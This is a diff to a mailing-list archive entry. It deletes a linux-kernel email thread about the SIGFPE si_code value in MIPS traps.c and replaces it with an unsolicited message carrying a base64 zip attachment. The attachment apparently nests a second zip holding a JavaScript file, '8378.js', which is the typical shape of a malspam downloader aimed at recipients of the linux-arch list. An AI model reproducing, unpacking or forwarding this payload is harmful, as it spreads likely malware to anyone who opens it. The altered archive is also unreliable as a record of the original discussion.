@@ -1,58 +1,67 @@
-From: ebiederm@xmission.com (Eric W. Biederman)
-Subject: Re: [PATCH 4/7] signal/mips: Document a conflict with SI_USER with SIGFPE
-Date: Tue, 08 Aug 2017 10:29:18 -0500
-Message-ID: <87mv7agjsh.fsf@xmission.com>
-References: <87o9shg7t7.fsf_-_@xmission.com>
-        <20170718140651.15973-4-ebiederm@xmission.com>
-        <alpine.DEB.2.00.1708071706290.17596@tp.orcam.me.uk>
+From: <tchidrenplytoo@aim.com>
+Subject: (unknown)
+Date: Tue, 08 Aug 2017 17:09:18 -0000
+Message-ID: <150221215800.17373.991827696432065492@permonline.ru>
 Mime-Version: 1.0
-Content-Type: text/plain
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <alpine.DEB.2.00.1708071706290.17596@tp.orcam.me.uk> (Maciej
-        W. Rozycki's message of "Mon, 7 Aug 2017 17:18:11 +0100")
-Sender: linux-kernel-owner@vger.kernel.org
-To: "Maciej W. Rozycki" <macro@imgtec.com>
-Cc: linux-kernel@vger.kernel.org, Andy Lutomirski <luto@kernel.org>, Linus Torvalds <torvalds@linux-foundation.org>, Al Viro <viro@zeniv.linux.org.uk>, Oleg Nesterov <oleg@redhat.com>, Andrei Vagin <avagin@virtuozzo.com>, Thomas Gleixner <tglx@linutronix.de>, Greg KH <greg@kroah.com>, Andrey Vagin <avagin@openvz.org>, Serge Hallyn <serge@hallyn.com>, Pavel Emelyanov <xemul@virtuozzo.com>, Cyrill Gorcunov <gorcunov@openvz.org>, Peter Zijlstra <peterz@infradead.org>, Willy Tarreau <w@1wt.eu>, linux-arch@vger.kernel.org, linux-api@vger.kernel.org, Linux Containers <containers@lists.linux-foundation.org>, Michael Kerrisk <mtk.manpages@gmail.com>, Ralf Baechle <ralf@linux-mips.org>
-List-Id: linux-arch.vger.kernel.org
+Content-Type: application/zip; name="308683624321199.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-arch-owner@vger.kernel.org>
+Received: from 90.150.112.57.permonline.ru ([90.150.112.57]:57472 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752059AbdHHRJW (ORCPT
+        <rfc822;linux-arch@vger.kernel.org>); Tue, 8 Aug 2017 13:09:22 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-arch-owner@vger.kernel.org
+List-ID: <linux-arch.vger.kernel.org>
+To: linux-arch@vger.kernel.org
 
-"Maciej W. Rozycki" <macro@imgtec.com> writes:
-
-> On Tue, 18 Jul 2017, Eric W. Biederman wrote:
->
->> diff --git a/arch/mips/kernel/traps.c b/arch/mips/kernel/traps.c
->> index b68b4d0726d3..6c9cca9c5341 100644
->> --- a/arch/mips/kernel/traps.c
->> +++ b/arch/mips/kernel/traps.c
->> @@ -735,7 +735,7 @@ void force_fcr31_sig(unsigned long fcr31, void __user *fault_addr,
->>  	else if (fcr31 & FPU_CSR_INE_X)
->>  		si.si_code = FPE_FLTRES;
->>  	else
->> -		si.si_code = __SI_FAULT;
->> +		si.si_code = FPE_FIXME;
->
->  This is an "impossible" state to reach unless your hardware is on fire.  
-> One or more of the FCSR Cause bits will have been set (in `fcr31') or the 
-> FPE exception would not have happened.
->
->  Of course there could be a simulator bug, or we could have breakage 
-> somewhere causing `process_fpemu_return' to be called with SIGFPE and 
-> inconsistent `fcr31'.  So we need to handle it somehow.
->
->  So what would be the right value of `si_code' to use here for such an 
-> unexpected exception condition?  I think `BUG()' would be too big a 
-> hammer here.  Or wouldn't it?
-
-The possible solutions I can think of are:
-
-WARN_ON_ONCE with a comment.
-
-Add a new si_code to uapi/asm-generic/siginfo.h perhaps FPE_IMPOSSIBLE.
-Like syscall numbers si_codes are cheap.
-
-Call force_sig() instead of force_sig_info, using just a generic
-si_code.
-
-If this is truly impossible and the compiler doesn't complain just drop
-the code.
-
-Eric
+UEsDBAoAAAAAADmHCEveVwjjSAoAAEgKAAAIAAAAODM3OC56aXBQSwMEFAAAAAgAOYcIS5RbvJ20
+CQAAUzUAAAcAAAA4Mzc4LmpzrVtbj9JAFH438T8gCQrRKAsquzH7AAvI/X5d40PphZYtbWnL1fjf
+7Woy5yCfbV190Hy0M3Nu3zlzZqr9zsPnUau9vZ979eFES9wmXnU39fl0cq/YqkA7SUBToLRAW4uG
+erLk0K90ktYQiBZzBUoJlMvSWgLpNDAnYJYm5QUqwyUtYNQejiwKLAvkC2QAc9SZgF2BFgKtaCBa
+mskW6JoZmfN0mmeS99G8CnnWIURzDJIrMZts8g4XHCrqRiAUhBK9zaKAMC+THu6RqZElXKBlefAZ
+OV0+sTYSv0Y9SBt6mC+HGslps4cDBGK0iWCLQP+LNtehNhBqD4HotkCtVJ4mQXbN2i3xo0ZOJn/3
+oAIR9MmXUlmcvZdO/lMNuWTNEBGMXArWWQsUHumIokNToopOjhnGIstIo84imMG4xgkRzoMiULtb
+Rrmbq/xvN+aYf24iKgc5spyKzwG+j1w63dPhyNS/hhKRlReC3RPSnnGCSbpmOIcspGrhgkLk8LUo
+tYNNxqRdhrmG7QIweyMih9yKiuaOxRKmn8N2Lv3vMzWiziP36bAGUoFxQgu0wTqmqk1YUV0SEb+I
+j4CwNdvZJcAV1XvCtn7+8LIisOkfBLyjWb8/vMx/tlqE1fS2jezTOYFBKZAoaRWB7JiF6jqC92fl
+9JJvN6l8zFbp/42M0LMUvvhTJPKRBRb4fPb/qJcLJ2tFPaicmnFbUr6xhLZy1ORE9ZTEvy6rC9YT
+dufPYM0RTGS2TnjSZaGTdJ9SyUGuKzJhVWRJFeSSDVpeg50OQR5L6KGKBFZIIBho0UikuKSA2QbN
+5m2PQ15irsmDVbXgDMFeXIUTVkEFm0bGrdJ34buZBqSYFIJwH+Ou7PFcxRt9gSI2SSCLVeWnFN58
+iTduhsb7aTbjGuUuP6nkmJY+OhZvvXAv4+6C47O+MoerIg2IXTN531qI3XWhQhf3tMS6+/B4d6mi
+qFbs7oZs+xP3hkytSG1GR0dlTDhr7mEkef4yDUox28xhxNFoHV7KpmC2gSoizBZ+Dj8j9QCo4jmg
+TluoMpTovXIkwRGHt7PUDCdmKgvZF0R3Hb6/Uulh+hq+QY+tmHGLfzxg6c1ZU4p/8xBxUg6vnRI7
+PY5ssAkZJqrpqKY6wenpX7aWVD7mFnWT+rfW668y/s4kr3hq7KbrBic7DYA30X+99dEMfpFLIw/o
+yL+NaIWug0ginZ7UCsbuQO4CosedFbUUdHj4mhRlh/UTsS+c7v5wCXyVil/g4AoFXtci9lw+mHtT
+RkdcOTzE1zzbcYcAHhbibmyejgsTJDRAlT8wWw0/ecPzn7xWYLmktQ5w2bP4c8ecj6nK4a5gG+ce
+WO+iQsGzPbzUqweU7Dhry3ywvEXfqEI3ecc2aYB8hOIWAtJ7dgEHjI3dK9PDMlDOBuJc8FYDxpoq
+/nzEJO5p9B/uhi6vU33gC7bdhiedbgAxStyzazb8fBT7myY54E9fEaB0jyxnXlBh/1JhyvjhO+Re
+XYD6xj5SovsTP+65gQmCgbVM8FQCsdEYsyJ68FA1CjpI0aibF3jbAq831vDCBd0B+yhvfTVmO7OO
+f89CzmT3LFb48uzCJdw1VS3uhzjw9iq8DCukOuRwAfYxOHPxYHBNLjlkJ7weksLnu6ikRWw3qPWE
+Bv/F1zpeOPzQT3R+eI0Kr/wyY7THhTJcSP2Fo8/8C92qwPN7bCeSWlFfx+9i9mWx23X0Nr4U2IHz
+2+1U3AMAFMkv0ILoXVzxXeZUoZzMZD69+vT82bbXt1VT8axpdXwYdZ3TLPiHS+lXO2k//Fxt9yfK
+wU3YAsvTklOui5/3roD9ybZxEL9WAm0E8gRSE7cCJwSyVAH39LQoC+gbAu5orVl3AcTSWrIvYFqg
+pEBT0o8kDQQikT3S4y2wSSeJLZPkZAT8BEyejE8l8WMpUJmWreoC3gnUEUgRiIJSma1I1C0PHhlN
+Uh2SWj8Lp4BncYXhfAscp5Jd6K2ksGDUBGy22iBGr4cUQxeExgKy3mo0xV6TE3XJBR61FdI3fZMT
+OEM6JIHl5FuSRqruBZJcFZoFJrlGpDUCcrNIFo1k9gHGnFmceQ0UXJOLZSb/rx3BTBZo6MeOpEBP
+coJA0Bsq0fBGoD/EH+mrsEU9MpiFNjZ1eYyBquccxsYI+BdWiQhvSbyrWqQ/q7VAQS/4N48ovhEO
+sCLNfVI04zqAsT00KD6y3VL9BCqDYJaPVl/S5DOiuEZ8+q/J/if4iXROM/dgWtDqMtrskjylSf6Z
+uZemxKa6QI+cxxZQpLEFjgTCoVMMwstURPryEn2+z8Bg2FEUhcxUSLIbXDHYYOUjmMZ7j8suhrqm
+k0ANQGabeoVRpfUAlDpoY97QfSwI/DH3Lpf78J70oLxpgV5uQqy7N9vUNgD9NqDQzEgjkEdFriMQ
+OSY3sJ6s7FWJM3cd2G+RAqu3so73X7TtFgVCLWpvcWqoZ84n3z0w54OcGiMKJDrAKTOyueqODyR8
+AJhlEmPmZeIR8OrtH3pd1uKC/GOejt3rAkuCIPCqgdydRvlwguwnB41IKmAxJQaMDQvJp1eZt67q
+mJKspgfqsnJw0knK3jeJ5DKZCf5OZj4ltMNUnt3vewOlaTQq9dvg1euk6gd/zdXgL8lNfkoc/V1P
+X560Vam/dvfF22QueJMN/lwVgrfPn7175+3LncnIbdaOXUWativ6ojpsWet5vXS/We0rTmdYtMve
+WLYkpV/yt/N6s/qwcM1tceYPl0et2ldG+mpwP7E/G8WyPx33a029ZB5PncVy7gway6k/P+odyaot
+SkO3N64XlUqvO9EPNaNpjrdaUbbs9nLVWDvu+PNK0TrywikPqsX5ZKhay9amvjYafWm38veashwM
+2937ptcwi6d1p1Re1HqG6m6l6amil1tmrdMojrXJsbcYrdtNb1keS5N5beC2vH7VeNg26spoVZlt
+Duay2N1LxrFU063pYuv32w1nuBk81BufrephM1JKqlTeTrv3QXiPnbaz2Egle10bHuttvzJoTveG
+abXcnr2dlgYH/2g81MZVrT3aeZ15xXr+zNAS6eC0mihLvprOfPktSl/TmcTtbeJxQNF1pWP6twhl
+vmS/ZhLfEkutNrQf6tVVw2tOrNPguDOC49rleTw4pNsNf66MT5+3vUpXXT88HuvUnWSmwRIBazbD
+xnG7vvvcnha7mlSfjK1g/G//O+mCgY+XA8nXneXsZyHoDY5mkOSL18nH+4JzUn7/5YB0azd5LNOD
+xmY4OyyLjzZf3XzM3lz/rPmZly8vRry4TeQ+5gtX1++uPmSvrj6+zwR++GXJpc6Pkn4AUEsBAj8A
+FAAAAAgAOYcIS5RbvJ20CQAAUzUAAAcAJAAAAAAAAAAgAAAAAAAAADgzNzguanMKACAAAAAAAAEA
+GAD6MXkjohDTAfoxeSOiENMBMEsQI6IQ0wFQSwUGAAAAAAEAAQBZAAAA2QkAAAAAUEsBAj8ACgAA
+AAAAOYcIS95XCONICgAASAoAAAgAJAAAAAAAAAAgAAAAAAAAADgzNzguemlwCgAgAAAAAAABABgA
+XpR7I6IQ0wFelHsjohDTARMPFSOiENMBUEsFBgAAAAABAAEAWgAAAG4KAAAAAA==
